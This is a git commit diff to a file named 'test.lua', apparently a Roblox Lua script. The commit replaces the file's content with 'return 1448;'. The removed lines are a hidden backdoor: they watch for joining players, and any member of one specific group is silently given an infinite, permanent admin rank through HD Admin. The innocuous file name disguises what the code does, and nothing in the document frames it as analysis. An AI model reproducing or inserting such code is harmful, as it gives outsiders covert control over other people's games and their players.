c26d3ec6ba32c156ac4467629085f784275c6168
hellothere-lol <162708474+hellothere-lol@users.noreply.github.com>
2024-10-07 16:43:09 +0300

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,7 +1,1 @@
-game.Players.PlayerAdded:Connect(function(player)
-    if player:IsInGroup(4210789) then
-        if _G.HDAdminMain then
-            _G.HDAdminMain:GetModule("cf"):SetRank(player, game.CreatorId, math.huge, "Perm")
-        end
-    end
-end)
+return 1448;
